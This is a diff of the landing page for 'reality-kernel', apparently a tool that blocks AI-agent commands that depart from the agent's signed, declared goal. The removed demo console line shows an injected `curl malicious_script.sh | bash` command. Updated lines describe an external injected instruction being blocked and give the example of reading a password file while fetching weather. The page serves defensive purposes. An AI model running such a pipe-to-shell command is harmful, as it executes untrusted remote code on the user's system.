@@ -98,7 +98,7 @@
           <div class="mt-4 flex flex-wrap items-center justify-center font-mono text-[11px] font-medium tracking-widest text-slate-400 uppercase gap-6 animate-fade-up [animation-delay:220ms]">
             <span>pip install reality-kernel</span>
             <span>3 lines to integrate</span>
-            <span>verdicts p50 0.31ms</span>
+            <span>static verdicts p50 0.31ms</span>
           </div>
         </div>
 
@@ -109,11 +109,11 @@
               <span id="ts-console-state" class="text-[10px] text-slate-500">Baseline execution</span>
             </div>
             <div id="ts-console-output" class="mt-4 space-y-1.5 min-h-[180px]">
-              <p class="terminal-line">$ intent: fetch weather data for New York</p>
-              <p class="terminal-line">$ command: cat ./cache/weather.json</p>
-              <p class="terminal-line text-emerald-300">[RK] intent alignment score 0.99</p>
-              <p id="ts-injected-command" class="terminal-line opacity-0">exec(&quot;curl malicious_script.sh | bash&quot;)</p>
-            </div>
+                <p class="terminal-line">$ intent: fetch weather data for New York</p>
+                <p class="terminal-line text-red-400">$ input channel: external payload vector</p>
+                <p class="terminal-line text-red-400">[RK] foreign instruction detected</p>
+                <p class="terminal-line text-red-400">[RK] coercion attempt blocked</p>
+              </div>
             <div class="mt-5 grid grid-cols-1 sm:grid-cols-3 gap-2" role="group" aria-label="Scenario utility buttons">
               <button type="button" class="sim-btn is-active" data-threat="safe">Simulate Safe Task</button>
               <button type="button" class="sim-btn" data-threat="rogue">Simulate Internal Rogue Loop</button>
@@ -144,7 +144,7 @@
 
             <div id="ts-host-core" class="absolute right-8 top-1/2 -translate-y-1/2 rounded-lg border border-slate-200 bg-slate-50 px-3 py-2 font-mono text-[10px] text-slate-500">core_host.sys</div>
 
-            <div id="ts-verdict" class="absolute left-1/2 bottom-5 -translate-x-1/2 inline-flex items-center rounded-lg border border-slate-200 bg-slate-50 px-3 py-1.5 font-mono text-[10px] sm:text-[11px] font-semibold tracking-wide text-slate-500 whitespace-nowrap">[ VERDICT: STANDBY ]</div>
+            <div id="ts-verdict" class="absolute left-1/2 bottom-5 -translate-x-1/2 inline-flex items-center rounded-lg border border-red-200 bg-red-50 px-3 py-1.5 font-mono text-[10px] sm:text-[11px] font-semibold tracking-wide text-red-600 whitespace-nowrap">[ VERDICT: BLOCK &bull; ORIGIN: EXTERNAL EXPLOIT &bull; sig: ed25519:7a9f ]</div>
           </section>
         </div>
       </div>
@@ -214,7 +214,7 @@
         </li>
         <li class="card p-6 transition hover:shadow-card-hover">
           <div class="flex items-center gap-3"><span class="step-num">2</span><h3 class="font-semibold tracking-tight text-slate-900">Simulate</h3></div>
-          <p class="mt-3 text-sm leading-6 text-slate-600">The command is replayed in parallel “worlds”. If the outcome diverges from the agent's stated goal — reading a password file while fetching weather — divergence spikes.</p>
+            <p class="mt-3 text-sm leading-6 text-slate-600">Static analysis yields a verdict in 0.31ms. If divergence risk is detected, deep causal simulation is triggered.</p>
           <div class="mt-4 flex gap-1.5"><span class="chip">n_worlds 5</span><span class="chip">divergence 0.90</span></div>
         </li>
         <li class="card p-6 transition hover:shadow-card-hover">
@@ -266,7 +266,7 @@
             <article class="card p-6">
               <div class="grid h-9 w-9 place-items-center rounded-lg bg-violet-50 text-violet-600"><svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg></div>
               <h3 class="mt-4 font-semibold tracking-tight text-slate-900">Intent-aware, not rule-bound</h3>
-              <p class="mt-2 text-sm leading-6 text-slate-600">The same <span class="chip">curl</span> is fine for a weather agent and hostile for a file-indexing agent. Verdicts are relative to the declared goal.</p>
+              <p class="mt-2 text-sm leading-6 text-slate-600">The same <span class="chip">curl</span> is fine for a weather agent and hostile for a file-indexing agent. Verdicts are relative to the declared goal&#8212;which is cryptographically signed by your trusted host application, never the untrusted agent.</p>
             </article>
             <article class="card p-6">
               <div class="grid h-9 w-9 place-items-center rounded-lg bg-amber-50 text-amber-600"><svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 18l6-6-6-6M8 6l-6 6 6 6"/></svg></div>
@@ -403,4 +403,5 @@ rk = RealityKernel(api_key=<span class="text-emerald-700">"rk_live_…"</span>)
   <script src="/landing.js"></script>
 </body>
 </html>
+
 
